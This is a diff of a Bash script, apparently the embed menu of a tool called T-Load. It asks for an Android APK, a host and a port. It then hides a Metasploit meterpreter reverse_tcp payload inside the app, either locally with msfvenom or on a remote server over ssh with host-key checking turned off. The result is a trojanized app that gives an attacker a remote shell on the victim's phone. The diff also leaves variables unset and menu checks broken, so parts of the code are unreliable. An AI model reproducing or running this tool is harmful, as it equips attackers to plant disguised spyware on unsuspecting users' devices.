@@ -1,78 +1,83 @@
 source $HOME/T-Load/host
-source "$HOME/.msf_default/pay"
-dir=$HOME/T-Load
-clear
-echo "1) Upload original app"
-echo "2) Embed"
-echo "3) Download embed app"
-echo "4) Exit to Main Menu"
-read -p ">|" embc
-clear
-if [ $embc = "1" ]
+source $HOME/T-Load/tload
+if [ "$v" == "8" ]
 then
+echo "Embed is closed until V9 is released. Stay tuned"
+exit
+fi
+dir=$HOME/T-Load
 clear
 echo " Enter the path to the original apk WITH .apk extension."
 read -p ">|" upath
-rm $HOME/.msf_default/pay
-echo "oapp=$(echo "$upath" | rev | cut -d"/" -f1 | rev)" >> $HOME/.msf_default/pay
+echo ""
 echo " Enter the download path with the final name with .apk extension "
 read -p ">|" dpath
-echo "dpath=$dpath" >> $HOME/.msf_default/pay
-echo "fapp=$(echo "$dpath" | rev | cut -d"/" -f1 | rev)" >> $HOME/.msf_default/pay
-rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" $upath sathvik@$host:/home/sathvik/payload
-sleep 3
-$dir/embed
-elif [ $embc = "2" ]
-then
-clear
+echo ""
 echo "Enter the host"
 read -p ">|" vh
+echo ""
 echo "Enter the port"
 read -p ">|" vp
+echo ""
+echo "Select payload generation option"
+echo "1. Embed Payload from your device"
+echo "2. Embed Payload from server (Avoids Errors, High embed speed)"
+echo "3. Go back to main menu"
+read -p ">|" em
+
+#############################
+## Embed payload in device ##
+#############################
+
+if [ $em = "1" ]
+then
+clear
+msfvenom -x $upath -p android/meterpreter/reverse_tcp LHOST=$vh LPORT=$vp -o $dpath
+echo ""
+echo ""
+echo "Press enter to continue to main menu"
+read garbage
+tload
+
+###############################
+## Embed payload from server ##
+###############################
+
+elif [ $em = "2" ]
+then
+################
+## Upload apk ##
+################
+clear
+echo "Press Enter to upload your app or [ctrl + c] to exit"
+read garbage
+rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" $upath sathvik@$host:/home/sathvik/payload
+sleep 3
+
+###########
+## Embed ##
+###########
+clear
+echo "Press Enter to embed your app or [ctrl + c] to exit"
+clear
 ssh -o StrictHostKeyChecking=no -i $dir/key sathvik@$host -t "sudo bind.sh $vh $vp $oapp $fapp"
 sleep 3
-$dir/embed
-elif [ $embc = "3" ]
-then
+
+##################
+## Download apk ##
+##################
 clear
-echo " Your last embed app was $oapp. It will be downloaded to $dpath as $fapp "
-echo "Is this correct? (y/n)"
-read -p ">|" co
-if [ $co = "y" ] || [ $co = "Y" ]
-then
+echo "Press Enter to upload your app or [ctrl + c] to exit"
 rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" sathvik@$host:/home/sathvik/embed/$fapp $dpath
-elif [ $co = "n" ] || [ $co = "N" ]
-then 
-clear
-echo "Enter the name that you choosed for final apk"
-read -p ">|" fn
-sleep 1
-echo 
-echo 
-echo "Enter the download location"
-read -p ">|" fdn
-sleep 2
-echo 
-echo
-rsync -r -v --progress -e "ssh -i $dir/key -o StrictHostKeyChecking=no" sathvik@$host:/home/sathvik/embed/$fn $fdn
-else 
-clear
-echo "Wrong Choice. Please try again"
-sleep 2
-tload embed
-fi
-echo
-echo
-echo
 echo
 echo "If there was no error seen while downloading, then you app has been downloaded to "$dpath " with a name "$dname
 sleep 5
 tload
-elif [ $embc = "4" ]; then
+elif [ $embc = "3" ]; then
 tload
 else
 clear
 echo "Wrong Choice"
-sleep 2
-tload embed
+sleep 3
+$dir/embed
 fi
